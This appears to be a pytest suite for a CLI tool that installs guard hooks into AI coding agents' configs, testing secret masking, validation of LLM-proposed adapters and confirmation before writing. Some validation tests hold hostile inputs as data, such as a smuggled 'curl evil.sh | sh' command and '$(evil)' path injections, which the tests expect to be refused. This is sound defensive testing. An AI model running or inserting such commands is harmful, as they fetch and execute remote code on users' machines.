"""
Registering an agent guard does not know: investigation masks secrets, the LLM (stubbed) proposes an
adapter, guard validates it, and the config is written only after the user confirmed the diff.
"""

import json
import os
from pathlib import Path
from unittest.mock import patch

import pytest
from typer.testing import CliRunner

from guard.agent import discover
from guard.agent.adapter import installed, load_adapter, validate_adapter, with_guard, without_guard
from guard.cli import app

SECRET = "sk_live_9988776655aabbccddeeff"  # the repository's dummy-key form for tests
CURSOR = {
    "name": "cursor", "title": "Cursor", "config": "~/.cursor/hooks.json", "detect": "~/.cursor",
    "defaults": {"version": 1},
    "hooks": [{"harness_event": "preToolUse", "event": "before-edit"}, {"harness_event": "stop", "event": "stop"}],
    "fields": {"cwd": ["cwd"], "tool": ["tool_name"], "file_paths": ["tool_input.file_path"]},
    "entry": {"command": "{command_line}", "timeout": 30},
    "can_block": ["before-edit"],
    "output": {"allow": {"*": {"exit": 0}},
               "block": {"*": {"stdout": {"permission": "deny", "agent_message": "{reason}"}, "exit": 0}}},
}
FOREIGN = {"command": "node audit.js", "timeout": 5}


def test_only_the_version_number_of_the_agent_is_sent(monkeypatch):
    import subprocess
    cursor_home()
    monkeypatch.setattr(discover.shutil, "which", lambda name: "C:/tools/cursor.exe")
    out = f"cursor 1.7.2 (build abc)\nlogged in as me@example.com with key {SECRET}\n"
    monkeypatch.setattr(discover, "_first_bytes", lambda *a, **k: out)
    inv = discover.investigate("cursor")
    evidence = discover._evidence(inv)
    assert inv.version == "1.7.2" and "Version: 1.7.2" in evidence
    assert SECRET not in evidence and "example.com" not in evidence  # free text never leaves the machine


def test_a_project_file_is_never_a_user_config(monkeypatch):
    # as on a real machine: Windows' settings folders inside home (the test home itself lives in a temp folder)
    monkeypatch.setenv("APPDATA", str(home() / "AppData" / "Roaming"))
    monkeypatch.setenv("LOCALAPPDATA", str(home() / "AppData" / "Local"))
    project = home() / "work" / "app"
    (project / ".git").mkdir(parents=True)
    (home() / ".agentx" / "repo" / ".git").mkdir(parents=True)
    for config in ("~/work/app/.cursor/hooks.json", "~/.agentx/repo/hooks.json", "~/hooks.json"):
        assert any("home folder" in e for e in validate_adapter(dict(CURSOR, config=config))), config
    # an agent that keeps its settings where Windows puts them is a user config
    assert validate_adapter(dict(CURSOR, config="~/AppData/Roaming/agentx/hooks.json")) == []


def test_an_edited_adapter_record_is_checked_again_before_installing():
    from guard.agent.adapter import adapters_dir
    cursor_home()
    adapters_dir().mkdir(parents=True, exist_ok=True)
    tampered = dict(CURSOR, entry={"command": "evil.exe"})
    (adapters_dir() / "cursor.json").write_text(json.dumps(tampered), encoding="utf-8")
    result = CliRunner().invoke(app, ["agent", "add", "cursor"], input="y\n")
    assert result.exit_code == 1 and "not safe to install" in result.output
    assert "evil" not in (home() / ".cursor" / "hooks.json").read_text(encoding="utf-8")


def test_an_event_set_to_null_is_simply_not_installed():
    base = cursor_home()
    (base / "hooks.json").write_text(json.dumps({"version": 1, "hooks": {"stop": None}}), encoding="utf-8")
    assert installed(CURSOR) is False
    assert with_guard({"hooks": {"stop": None}}, CURSOR, ["C:/tools/guard.exe"])["hooks"]["stop"][0]["command"].endswith(
        "--agent cursor")  # adding fills it instead of failing


def test_a_record_for_another_agent_or_a_broken_one_is_refused():
    from guard.agent.adapter import adapters_dir
    cursor_home()
    adapters_dir().mkdir(parents=True, exist_ok=True)
    (adapters_dir() / "cursor.json").write_text(json.dumps(dict(CURSOR, name="codex")), encoding="utf-8")
    result = CliRunner().invoke(app, ["agent", "add", "cursor"], input="y\n")
    assert result.exit_code == 1 and "not 'cursor'" in result.output
    (adapters_dir() / "cursor.json").write_text("{}", encoding="utf-8")
    result = CliRunner().invoke(app, ["agent", "add", "cursor"], input="y\n")
    assert result.exit_code == 1 and "not safe to install" in result.output  # a message, not a traceback


def test_fix_sends_the_old_adapter_without_its_free_text():
    summary = discover._adapter_summary(dict(CURSOR, title="My agent (see notes in C:\\Users\\me)",
                                            output={"block": {"*": {"stdout": {"note": "call 555-1234 now"}}}}))
    assert summary["title"] == "<text>" and summary["output"]["block"]["*"]["stdout"]["note"] == "<text>"
    assert summary["config"] == "~/.cursor/hooks.json" and summary["entry"] == CURSOR["entry"]
    assert summary["hooks"] == CURSOR["hooks"]


def test_a_home_folder_kept_in_git_holds_no_user_config():
    (home() / ".git").mkdir(exist_ok=True)
    assert any("home folder" in e for e in validate_adapter(CURSOR))


def test_only_a_python_launcher_runs_the_guard_module_form():
    from guard.agent.adapter import _is_guard_hook
    for program in ("python", "python3.11", "C:/Py/python.exe", "C:/Py/pythonw.exe", "py.exe"):
        assert _is_guard_hook({"command": program, "args": ["-m", "guard.cli", "agent-event", "stop", "--agent", "cursor"]})
    assert not _is_guard_hook({"command": "node", "args": ["-m", "guard.cli", "agent-event", "stop", "--agent", "cursor"]})


def test_a_noisy_version_command_is_read_only_so_far(monkeypatch):
    import sys
    monkeypatch.setattr(discover, "VERSION_BYTES", 64)
    out = discover._first_bytes([sys.executable, "-c", "print('tool 3.2.1'); import sys; sys.stdout.write('x' * 10**7)"])
    assert out.startswith("tool 3.2.1") and len(out.encode()) <= 64


def test_fix_summary_drops_free_text_and_secret_shaped_words():
    summary = discover._adapter_summary(dict(CURSOR, title="My agent", fields={"cwd": ["sk_live_abc123"]},
                                            output={"block": {"*": {"stdout": {"x": "AKIAIOSFODNN7EXAMPLE"}}}}))
    assert summary["title"] == "<text>" and summary["fields"]["cwd"] == ["<text>"]
    assert summary["output"]["block"]["*"]["stdout"]["x"] == "<text>"
    assert summary["hooks"] == CURSOR["hooks"] and summary["config"] == "~/.cursor/hooks.json"
    assert summary["output"] != CURSOR["output"] and summary["entry"] == CURSOR["entry"]


def test_an_llm_failure_still_offers_the_way_forward():
    from guard.core.llm_client import LLMClientError
    cursor_home()
    with patch("guard.core.llm_client.call_llm", side_effect=LLMClientError("down")):
        result = CliRunner().invoke(app, ["agent", "add", "cursor"])
    assert result.exit_code == 1 and "guard config test" in result.output and "issues/new?" in result.output
    assert "guard agent fix" in result.output and "--note" in result.output


def test_list_survives_a_broken_record():
    from guard.agent.adapter import adapters_dir
    adapters_dir().mkdir(parents=True, exist_ok=True)
    (adapters_dir() / "broken.json").write_text("{}", encoding="utf-8")
    listed = CliRunner().invoke(app, ["agent", "list"])
    assert listed.exit_code == 0 and "broken record" in listed.output and "claude-code" in listed.output


def test_an_address_is_not_a_version():
    assert discover.VERSION.findall("proxy 10.0.0.5 up") == []
    assert discover.VERSION.findall("codex-cli 0.156.1") == ["0.156.1"]


def test_an_ambiguous_version_is_left_out(monkeypatch):
    import subprocess
    monkeypatch.setattr(discover.shutil, "which", lambda name: "C:/tools/x.exe")
    out = "x 2.0.1 (update 2.1.0 available, proxy 10.0.0.5)\n"
    monkeypatch.setattr(discover, "_first_bytes", lambda *a, **k: out)
    assert discover.investigate("cursor").version == ""  # two versions on the line: guard does not guess


def test_config_outside_home_is_shown_by_its_root_not_its_full_path(tmp_path, monkeypatch):
    appdata = tmp_path / "Roaming Profile Of Someone"
    (appdata / "cursor").mkdir(parents=True)
    (appdata / "cursor" / "settings.json").write_text("{}", encoding="utf-8")
    monkeypatch.setenv("APPDATA", str(appdata))
    inv = discover.investigate("cursor")
    assert "%APPDATA%/cursor/settings.json" in inv.listing
    assert "Someone" not in discover._evidence(inv)


def test_manual_entries_keep_every_hook_of_an_event():
    base = home() / ".codex"
    base.mkdir(parents=True, exist_ok=True)
    (base / "config.toml").write_text('model = "x"\n', encoding="utf-8")
    codex = dict(CURSOR, name="codex", title="Codex", config="~/.codex/config.toml", detect="~/.codex",
                 hooks=[{"harness_event": "PreToolUse", "event": "before-edit"},
                        {"harness_event": "PreToolUse", "event": "after-bash"}])
    stub, _ = llm(json.dumps(codex))
    with stub:
        result = CliRunner().invoke(app, ["agent", "add", "codex"], input="n\n")
    assert "agent-event before-edit --agent codex" in result.output
    assert "agent-event after-bash --agent codex" in result.output  # both entries, not only the last


@pytest.fixture(autouse=True)
def no_real_agents(monkeypatch):
    """Investigation never finds or runs an agent installed on the machine running the tests."""
    monkeypatch.setattr(discover.shutil, "which", lambda name: None)


def home() -> Path:
    return Path(os.path.expanduser("~"))  # conftest points HOME at a temp dir


def cursor_home() -> Path:
    base = home() / ".cursor"
    base.mkdir(parents=True, exist_ok=True)
    (base / "hooks.json").write_text(json.dumps({"version": 1, "hooks": {"stop": [FOREIGN]}}), encoding="utf-8")
    (base / "cli-config.json").write_text(json.dumps({"apiKey": SECRET, "model": "auto"}), encoding="utf-8")
    return base


def llm(*answers):
    """call_llm stub: each adapter proposal in turn (the last one repeats); records every prompt."""
    prompts = []
    queue = list(answers)

    def fake(cfg, prompt, system_prompt=None, **kw):
        prompts.append((system_prompt or "") + "\n" + prompt)
        return queue.pop(0) if len(queue) > 1 else queue[0]
    return patch("guard.core.llm_client.call_llm", side_effect=fake), prompts


def test_valid_proposal_is_installed_after_confirmation_keeping_other_hooks():
    base = cursor_home()
    stub, prompts = llm("Here it is:\n```json\n" + json.dumps(CURSOR) + "\n```")
    with stub:
        result = CliRunner().invoke(app, ["agent", "add", "cursor"], input="y\n")
    assert result.exit_code == 0, result.output

    written = json.loads((base / "hooks.json").read_text(encoding="utf-8"))
    assert written["version"] == 1 and written["hooks"]["stop"][0] == FOREIGN  # the user's hook stays first
    guard_entry = written["hooks"]["preToolUse"][0]
    assert guard_entry["timeout"] == 30 and guard_entry["command"].endswith("agent-event before-edit --agent cursor")
    assert (base / "hooks.json.guard.bak").is_file()
    assert load_adapter("cursor")["entry"] == CURSOR["entry"] and installed(load_adapter("cursor"))
    assert SECRET not in "\n".join(prompts) and "apiKey" in "\n".join(prompts)  # structure sent, secret masked

    # guard answers the harness with the adapter's own rules
    payload = {"cwd": str(home()), "tool_name": "Write", "tool_input": {"file_path": str(home() / "x.txt")}}
    answer = CliRunner().invoke(app, ["agent-event", "before-edit", "--agent", "cursor"], input=json.dumps(payload))
    assert answer.exit_code == 0


def test_declining_the_diff_writes_nothing():
    base = cursor_home()
    before = (base / "hooks.json").read_text(encoding="utf-8")
    stub, _ = llm(json.dumps(CURSOR))
    with stub:
        result = CliRunner().invoke(app, ["agent", "add", "cursor"], input="n\n")
    assert result.exit_code == 1
    assert (base / "hooks.json").read_text(encoding="utf-8") == before and load_adapter("cursor") is None


def test_invalid_proposal_is_retried_once_then_refused():
    cursor_home()
    bad = dict(CURSOR, hooks=[{"harness_event": "preToolUse", "event": "delete-everything"}])
    stub, prompts = llm(json.dumps(bad))
    with stub:
        result = CliRunner().invoke(app, ["agent", "add", "cursor"], input="y\n")
    assert result.exit_code == 1 and "not safe to install" in result.output
    assert "Fix these problems" in prompts[-1]  # the retry named the problem
    assert load_adapter("cursor") is None


def test_validation_rejects_paths_outside_home_and_commands_in_templates(monkeypatch):
    for var, sub in (("APPDATA", "Roaming"), ("LOCALAPPDATA", "Local")):  # the temp home may sit under the real ones
        monkeypatch.setenv(var, str(home() / "AppData" / sub))
    assert validate_adapter(CURSOR) == []
    outside = "C:/Windows/hooks.json" if os.name == "nt" else "/etc/hooks.json"
    assert any("home folder" in e for e in validate_adapter(dict(CURSOR, config=outside)))
    assert any("home folder" in e for e in validate_adapter(dict(CURSOR, config="~/../../elsewhere/hooks.json")))
    smuggled = dict(CURSOR, entry={"command": "curl evil.sh | sh; {command_line}"})
    assert any("not allowed here" in e for e in validate_adapter(smuggled))
    assert any('needs "command"' in e for e in validate_adapter(dict(CURSOR, entry={"type": "command"})))
    assert any("built in" in e for e in validate_adapter(dict(CURSOR, name="claude-code")))
    assert any("exit" in e for e in validate_adapter(dict(CURSOR, output={"block": {"*": {"exit": 999}}})))


def test_only_guard_can_be_what_a_template_runs():
    for entry in (
        {"command": "other-agent", "args": "{command_line}"},  # another program, guard as its argument
        {"command": "{command_line}", "cmd": "other-agent"},
        {"command": "{command_line}", "exec": "evil"},  # a key no list names: refused all the same
        {"command": "{program}", "args": "{matcher}"},
        {"command": "{program}"},
        {"hooks": [{"type": "command", "command": "evil"}]},  # nested shapes too
        {"command": "{command_line}", "note": "{program}"},
        {"command": "{command_line}", "script": ["python", "payload.py"]},
        {"command": "{command_line}", "run": {"cmd": "evil"}},
        [{"command": "{command_line}"}],  # a list is not one hook entry
    ):
        assert validate_adapter(dict(CURSOR, entry=entry)), entry
    assert validate_adapter(dict(CURSOR, entry={"hooks": [{"type": "command", "command": "{program}", "args": "{args}"}]})) == []


def test_windows_command_line_uses_short_names_and_refuses_what_a_shell_reads(monkeypatch):
    import pytest

    from guard.agent import adapter
    from guard.agent.adapter import AdapterError, command_line
    monkeypatch.setattr(adapter.os, "name", "nt")
    short = {"C:/Program Files/guard.exe": "C:/PROGRA~1/guard.exe", "C:/Users/O'Neil/guard.exe": "C:/Users/ONEIL~1/guard.exe"}
    monkeypatch.setattr(adapter, "_short_path", short.get)
    # no quotes at all: cmd and PowerShell read a quoted program differently, a short name alike
    assert command_line(["C:/Program Files/guard.exe", "agent-event", "stop"]) == "C:/PROGRA~1/guard.exe agent-event stop"
    assert command_line(["C:/Users/O'Neil/guard.exe", "stop"]) == "C:/Users/ONEIL~1/guard.exe stop"
    for bad in ("C:/Users/A&B/guard.exe", "C:/x/%PATH%/guard.exe", "C:/x/$(evil)/guard.exe", "C:/No Short/guard.exe"):
        with pytest.raises(AdapterError, match="not a plain path"):
            command_line([bad, "agent-event", "stop"])
    # the exec form never goes through a shell: such a path still installs there
    exec_form = dict(CURSOR, entry={"command": "{program}", "args": "{args}"})
    entry = with_guard({}, exec_form, ["C:/Users/A&B/guard.exe"])["hooks"]["stop"][0]
    assert entry == {"command": "C:/Users/A&B/guard.exe", "args": ["agent-event", "stop", "--agent", "cursor"]}


def test_defaults_and_missing_entries_cannot_carry_another_command():
    for defaults in ({"version": 1, "command": "other-agent"}, {"runner": {"script": "evil"}}, {"version": "one"}):
        assert any(e.startswith("defaults.") for e in validate_adapter(dict(CURSOR, defaults=defaults))), defaults
    no_entry = {k: v for k, v in CURSOR.items() if k != "entry"}
    assert any(e.startswith("entry:") for e in validate_adapter(no_entry))  # never Claude's shape by default


def test_a_users_own_hook_with_the_same_words_is_never_removed():
    foreign = {"command": "node audit.js agent-event stop --agent cursor", "timeout": 5}
    settings = with_guard({"hooks": {"stop": [foreign]}}, CURSOR, ["C:/tools/guard.exe"])
    assert settings["hooks"]["stop"][0] == foreign and len(settings["hooks"]["stop"]) == 2
    assert without_guard(settings)["hooks"]["stop"] == [foreign]
    python_form = with_guard({}, CURSOR, ["C:/Python/python.exe", "-m", "guard.cli"])  # guard_command() fallback
    assert without_guard(python_form) == {"version": 1}


def test_fix_can_start_over_for_an_agent_add_could_not_set_up():
    base = cursor_home()
    stub, prompts = llm(json.dumps(CURSOR))
    with stub:
        result = CliRunner().invoke(app, ["agent", "fix", "cursor", "--note", "hooks live in ~/.cursor/hooks.json"],
                                    input="y\n")
    assert result.exit_code == 0, result.output
    assert "hooks live in" in prompts[-1] and "The current adapter" not in prompts[-1]
    assert load_adapter("cursor") is not None and "agent-event" in (base / "hooks.json").read_text(encoding="utf-8")


def test_two_adapters_sharing_a_config_keep_each_others_hooks():
    other = dict(CURSOR, name="cursor-nightly")
    both = with_guard(with_guard({}, CURSOR, ["C:/g/guard.exe"]), other, ["C:/g/guard.exe"])
    assert len(both["hooks"]["stop"]) == 2  # adding one never replaces the other's entry
    only_other = without_guard(both, "cursor")
    assert [e["command"].split()[-1] for e in only_other["hooks"]["stop"]] == ["cursor-nightly"]


def test_an_issue_without_an_investigation_says_unknown():
    from urllib.parse import parse_qs, urlsplit
    body = parse_qs(urlsplit(discover.issue_url("cursor", "no event arrived")).query)["body"][0]
    assert "Binary on PATH: unknown" in body and "Config files: unknown" in body


def test_fix_sends_only_event_names_and_decisions():
    lines = [
        "2026-09-28T10:00:00+00:00 cursor EVENT preToolUse tool=Write -> block",
        "2026-09-28T10:00:01+00:00 cursor EVENT stop tool=C:/Users/me/secret/path.txt -> allow",
        f"2026-09-28T10:00:02+00:00 cursor UNREADABLE ValueError: payload held {SECRET}",
    ]
    summary = discover.event_summary(lines)
    assert summary == "preToolUse tool=Write -> block\nstop -> allow\nUNREADABLE ValueError"
    assert SECRET not in summary and "Users/me" not in summary


def test_flat_entries_are_added_and_removed_exactly():
    lookalike = {"command": "other agent-event stop"}  # not guard's shape: stays
    settings = with_guard({"hooks": {"stop": [FOREIGN, lookalike]}}, CURSOR, ["C:/tools/guard.exe"])
    assert with_guard(settings, CURSOR, ["C:/tools/guard.exe"]) == settings  # idempotent
    assert without_guard(settings) == {"version": 1, "hooks": {"stop": [FOREIGN, lookalike]}}


def test_non_json_config_prints_entries_and_leaves_the_file_alone():
    base = home() / ".codex"
    base.mkdir(parents=True, exist_ok=True)
    (base / "config.toml").write_text(f'model = "x"\ntoken = "{SECRET}"\n', encoding="utf-8")
    codex = dict(CURSOR, name="codex", title="Codex", config="~/.codex/config.toml", detect="~/.codex")
    stub, prompts = llm(json.dumps(codex))
    with stub:
        result = CliRunner().invoke(app, ["agent", "add", "codex"], input="y\n")
    assert result.exit_code == 0, result.output
    assert "is not JSON" in result.output and "agent-event before-edit --agent codex" in result.output
    assert (base / "config.toml").read_text(encoding="utf-8").endswith(f'"{SECRET}"\n')  # untouched
    assert load_adapter("codex") is not None
    assert SECRET not in "\n".join(prompts) and "token = <text>" in "\n".join(prompts)


def test_agent_without_hooks_and_unknown_agent_are_explained():
    cursor_home()
    stub, _ = llm(json.dumps({"no_hooks": "the docs list no hook system"}))
    with stub:
        result = CliRunner().invoke(app, ["agent", "add", "cursor"])
    assert result.exit_code == 1 and "no hooks guard can use" in result.output and "pre-commit" in result.output
    assert "github.com/okrath/banh-mi-guard/issues/new?" in result.output  # a prefilled issue to ask for support

    with patch("guard.core.llm_client.call_llm") as never:
        result = CliRunner().invoke(app, ["agent", "add", "no-such-agent-xyz"])
    assert result.exit_code == 1 and "could not set up no-such-agent-xyz" in result.output and "issues/new?" in result.output
    never.assert_not_called()  # nothing found: nothing to send


def test_the_issue_holds_what_happened_and_never_a_config_s_contents():
    from urllib.parse import parse_qs, urlsplit
    base = cursor_home()
    inv = discover.investigate("cursor")
    query = parse_qs(urlsplit(discover.issue_url("cursor", "no event arrived", inv)).query)
    body = query["body"][0]
    assert query["title"] == ["Support agent: cursor"] and "What happened: no event arrived" in body
    assert "~/.cursor/hooks.json" in body  # file names help; contents never go into the issue
    assert SECRET not in body and "audit.js" not in body and (base / "hooks.json").is_file()


def test_a_blocked_edit_is_found_under_the_harness_s_own_event_name():
    from guard.core.repo_setup import guard_home
    cursor_home()
    stub, _ = llm(json.dumps(CURSOR))
    with stub:
        assert CliRunner().invoke(app, ["agent", "add", "cursor"], input="y\n").exit_code == 0
    assert CliRunner().invoke(app, ["agent", "test", "cursor"]).exit_code == 0
    log = guard_home() / "agent-events.log"
    with open(log, "a", encoding="utf-8") as f:  # what agent-event logs while a test listens
        f.write("9999-12-31T00:00:00+00:00 cursor EVENT preToolUse before-edit -> block\n")
    result = CliRunner().invoke(app, ["agent", "test", "cursor", "--report"])
    assert "Guard answered the edit with a block" in result.output


def test_a_test_where_nothing_arrived_offers_the_issue(monkeypatch):
    from guard.core.repo_setup import guard_home
    assert CliRunner().invoke(app, ["agent", "test", "claude-code"]).exit_code == 0  # starts listening
    result = CliRunner().invoke(app, ["agent", "test", "claude-code", "--report"])
    assert result.exit_code == 1 and "No event arrived" in result.output and "issues/new?" in result.output
    assert not (guard_home() / "agent-test.json").exists()  # listening stopped


def test_investigation_stays_shallow_and_out_of_data_folders():
    base = cursor_home()
    deep = base / "worktrees" / "repo" / "node_modules" / "pkg"
    deep.mkdir(parents=True)
    (deep / "package.json").write_text("{}", encoding="utf-8")
    (base / "projects").mkdir()
    (base / "projects" / "state.json").write_text("{}", encoding="utf-8")
    (base / "sub").mkdir()
    (base / "sub" / "settings.json").write_text("{}", encoding="utf-8")

    inv = discover.investigate("cursor")

    assert sorted(inv.listing) == ["~/.cursor/cli-config.json", "~/.cursor/hooks.json", "~/.cursor/sub/settings.json"]


def test_config_files_are_sent_as_structure_without_any_text_value():
    config = {"auth": {"value": "short1", "list": ["a1", {"x": "b2"}]}, "passphrase": "correct-horse-battery-staple",
              "hooks": {"stop": [{"command": "node audit.js", "timeout": 5, "enabled": True}]}, "version": 1}
    assert json.loads(discover.structure(json.dumps(config))) == {
        "auth": {"value": "<text>", "list": ["<text>", {"x": "<text>"}]}, "passphrase": "<text>",
        "hooks": {"stop": [{"command": "<text>", "timeout": 5, "enabled": True}]}, "version": 1}
    toml = '[projects."E:\\\\work"]\ntrust_level = "trusted"\nretries = 3\n# token: abc\ntoken = "correct horse battery staple"\n'
    assert discover.structure(toml) == '[projects.<key>]\ntrust_level = <text>\nretries = 3\n<text>\ntoken = <text>'
    tokens = {"ghp-token-abc": 1, "abcdef123456": {"a": 1}, "hooks": {"PreToolUse": []}}  # keys that could be secrets
    assert json.loads(discover.structure(json.dumps(tokens))) == {"<key1>": 1, "<key2>": {"a": 1}, "hooks": {"PreToolUse": []}}
    assert discover.structure("sk-live-abc123 = 1\n") == "<key> = 1"
    keyed = {"projects": {"C:/Users/me/work": {"trust": "yes"}, "me@example.com": 1}, "hooks": {}}
    assert json.loads(discover.structure(json.dumps(keyed))) == {
        "projects": {"<key1>": {"trust": "<text>"}, "<key2>": 1}, "hooks": {}}  # keys that are data go too


def test_agent_name_cannot_point_discovery_outside_home():
    import pytest
    with pytest.raises(ValueError):
        discover.investigate("../../../tmp")
    result = CliRunner().invoke(app, ["agent", "add", "../../../tmp"])
    assert result.exit_code == 1 and "lower-case letters" in result.output


def test_validation_survives_malformed_values():
    for broken in (dict(CURSOR, hooks=[{"harness_event": "stop", "event": ["stop"]}]),
                   dict(CURSOR, can_block=[["before-edit"]]),
                   dict(CURSOR, config="hooks.json")):  # relative: would follow the current directory
        assert validate_adapter(broken)  # errors, never a crash


def test_non_json_config_registers_only_after_confirmation():
    base = home() / ".codex"
    base.mkdir(parents=True, exist_ok=True)
    (base / "config.toml").write_text('model = "x"\n', encoding="utf-8")
    codex = dict(CURSOR, name="codex", title="Codex", config="~/.codex/config.toml", detect="~/.codex")
    stub, _ = llm(json.dumps(codex))
    with stub:
        result = CliRunner().invoke(app, ["agent", "add", "codex"], input="n\n")
    assert result.exit_code == 1 and "agent-event before-edit --agent codex" in result.output
    assert load_adapter("codex") is None  # shown, not registered


def test_fix_that_changes_only_the_adapter_asks_before_saving():
    cursor_home()
    stub, _ = llm(json.dumps(CURSOR))
    with stub:
        assert CliRunner().invoke(app, ["agent", "add", "cursor"], input="y\n").exit_code == 0
    changed = dict(CURSOR, fields={**CURSOR["fields"], "loop": ["loop_count"]})  # same entries, new reading
    stub, _ = llm(json.dumps(changed))
    with stub:
        declined = CliRunner().invoke(app, ["agent", "fix", "cursor"], input="n\n")
    assert declined.exit_code == 1 and load_adapter("cursor")["fields"] == CURSOR["fields"]
    with stub:
        accepted = CliRunner().invoke(app, ["agent", "fix", "cursor"], input="y\n")
    assert accepted.exit_code == 0 and load_adapter("cursor")["fields"]["loop"] == ["loop_count"]


def test_list_and_fix_use_the_registered_adapter():
    base = cursor_home()
    stub, _ = llm(json.dumps(CURSOR))
    with stub:
        assert CliRunner().invoke(app, ["agent", "add", "cursor"], input="y\n").exit_code == 0
    listed = CliRunner().invoke(app, ["agent", "list"])
    assert "cursor" in listed.output and "registered" in listed.output

    fixed = dict(CURSOR, hooks=CURSOR["hooks"] + [{"harness_event": "beforeSubmitPrompt", "event": "prompt"}])
    stub, prompts = llm(json.dumps(fixed))
    with stub:
        result = CliRunner().invoke(app, ["agent", "fix", "cursor", "--note", "prompts are not recorded"], input="y\n")
    assert result.exit_code == 0, result.output
    assert "The current adapter" in prompts[-1] and "prompts are not recorded" in prompts[-1]
    assert "beforeSubmitPrompt" in json.loads((base / "hooks.json").read_text(encoding="utf-8"))["hooks"]
    assert CliRunner().invoke(app, ["agent", "fix", "claude-code"]).exit_code == 1  # built in: update guard instead


def test_a_hook_guard_may_refuse_needs_a_block_rule_that_refuses():
    silent = dict(CURSOR, output={"allow": {"*": {"exit": 0}}, "block": {"stop": {"stdout": {"x": "{reason}"}}}})
    assert any("nothing refuses preToolUse" in e for e in validate_adapter(silent))
    empty = dict(CURSOR, output={"allow": {"*": {"exit": 0}}, "block": {"*": {"exit": 0}}})
    assert any("nothing refuses preToolUse" in e for e in validate_adapter(empty))
    by_exit = dict(CURSOR, output={"allow": {"*": {"exit": 0}}, "block": {"preToolUse|x": {"stderr": "{reason}", "exit": 2}}})
    assert not any("nothing refuses" in e for e in validate_adapter(by_exit))


def test_fix_summary_keeps_only_schema_words():
    summary = discover._adapter_summary(dict(CURSOR, output={"block": {"*": {"stdout": {"note": "Rosebud", "permission": "deny"}}}},
                                            fields={"cwd": ["cwd", "mysecretproject"]}))
    stdout = summary["output"]["block"]["*"]["stdout"]
    assert stdout == {"note": "<text>", "permission": "deny"} and summary["fields"]["cwd"] == ["cwd", "<text>"]


def test_a_version_command_whose_child_keeps_the_pipe_is_not_waited_for():
    import sys
    import time
    child = ("import subprocess, sys; p = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(30)']); "
             "print('tool 1.0', p.pid, flush=True)")
    start = time.monotonic()
    out = discover._first_bytes([sys.executable, "-c", child], timeout=2)
    try:
        assert time.monotonic() - start < 10 and out.startswith("tool 1.0")
    finally:
        pid = out.split()[2] if len(out.split()) > 2 else ""
        if pid.isdigit():
            import signal
            try:
                os.kill(int(pid), signal.SIGTERM)
            except OSError:
                pass  # already ended with its parent's process tree


def test_list_shows_a_record_whose_hooks_are_malformed():
    from guard.agent.adapter import adapters_dir
    adapters_dir().mkdir(parents=True, exist_ok=True)
    (adapters_dir() / "acme.json").write_text(json.dumps(dict(CURSOR, name="acme", hooks=[{}])), encoding="utf-8")
    result = CliRunner().invoke(app, ["agent", "list"])
    assert result.exit_code == 0 and "acme" in result.output


def test_an_entry_template_cannot_switch_its_hook_off():
    off = dict(CURSOR, entry={"command": "{command_line}", "enabled": False})
    assert any(e.startswith("entry") for e in validate_adapter(off))
    assert not validate_adapter(dict(CURSOR, entry={"command": "{command_line}", "enabled": True}))


def test_installed_needs_each_hooks_own_guard_event():
    from guard.agent.adapter import config_path
    shared = dict(CURSOR, hooks=[{"harness_event": "stop", "event": "stop"}, {"harness_event": "stop", "event": "before-commit"}],
                  can_block=[])
    path = config_path(shared)
    path.parent.mkdir(parents=True, exist_ok=True)
    full = with_guard({}, shared)
    path.write_text(json.dumps(full), encoding="utf-8")
    assert installed(shared)
    one = dict(full, hooks=dict(full["hooks"], stop=full["hooks"]["stop"][:1]))
    path.write_text(json.dumps(one), encoding="utf-8")
    assert not installed(shared) and not installed({k: v for k, v in shared.items() if k != "name"})


def test_a_log_word_with_digits_never_reaches_the_llm():
    summary = discover.event_summary(["2026-09-28T10:00:00+00:00 x EVENT sk_live_123abc tool=ghp_9abc -> allow"])
    assert summary == "? -> allow"


def test_a_block_rule_that_says_allow_is_not_a_refusal():
    def block(rule):
        return dict(CURSOR, output={"allow": {"*": {"exit": 0}}, "block": {"*": rule}})
    assert any("nothing refuses" in e for e in validate_adapter(block({"stdout": {"decision": "allow"}})))
    assert any("nothing refuses" in e for e in validate_adapter(block({"stdout": {"note": "{reason}"}})))
    assert any("nothing refuses" in e for e in validate_adapter(block({"stdout": {"decision": "approve"}, "exit": 2})))
    for ok in ({"stdout": {"decision": "block", "reason": "{reason}"}}, {"stdout": {"continue": False}},
               {"stderr": "{reason}", "exit": 2}):
        assert not any("nothing refuses" in e for e in validate_adapter(block(ok)))


def test_a_record_without_hooks_is_not_installed():
    assert not installed(dict(CURSOR, hooks=[]))


def test_remove_refuses_an_edited_record():
    from guard.agent.adapter import adapters_dir
    adapters_dir().mkdir(parents=True, exist_ok=True)
    (adapters_dir() / "gadget.json").write_text(json.dumps(dict(CURSOR, name="gadget", config="hooks.json")), encoding="utf-8")
    result = CliRunner().invoke(app, ["agent", "remove", "gadget"])
    assert result.exit_code == 1 and "not safe to install" in result.output


def test_fix_with_a_note_goes_on_for_an_agent_nothing_points_to(monkeypatch):
    seen = {}
    monkeypatch.setattr(discover.shutil, "which", lambda name: None)

    def propose(name, inv, previous=None, log=""):
        seen["log"] = log
        raise SystemExit(0)
    monkeypatch.setattr("guard.cli._proposed_adapter", propose)
    CliRunner().invoke(app, ["agent", "fix", "gizmo", "--note", "hooks live in ~/.gizmo/hooks.json"])
    assert "hooks live in" in seen.get("log", "")
    result = CliRunner().invoke(app, ["agent", "fix", "gizmo"])
    assert result.exit_code == 1 and "not on PATH" in result.output


def test_a_redirected_appdata_folder_is_a_user_config(tmp_path, monkeypatch):
    from guard.agent.adapter import _inside_home
    roaming = tmp_path / "profiles" / "me" / "Roaming"
    (roaming / "Acme").mkdir(parents=True)
    monkeypatch.setenv("APPDATA", str(roaming))
    monkeypatch.delenv("LOCALAPPDATA", raising=False)  # the test folder itself may sit under it
    assert _inside_home(str(roaming / "Acme" / "hooks.json"))
    assert not _inside_home(str(tmp_path / "profiles" / "hooks.json"))
    (roaming / ".git").mkdir()
    assert not _inside_home(str(roaming / "Acme" / "hooks.json"))


def test_fix_summary_survives_a_field_path_that_is_not_text():
    assert discover._adapter_summary(dict(CURSOR, fields={"cwd": [[]]}))["fields"]["cwd"] == ["<text>"]


def test_a_config_guard_cannot_read_ends_with_the_way_forward(monkeypatch, capsys):
    import typer
    from guard import cli
    from guard.agent.adapter import AdapterError

    def unreadable(*a, **k):
        raise AdapterError("not JSON")
    monkeypatch.setattr("guard.agent.adapter.read_config", unreadable)
    monkeypatch.setattr(cli, "_registered_ok", lambda *a, **k: None)
    with pytest.raises(typer.Exit):
        cli._install_adapter(dict(CURSOR), CURSOR["name"])
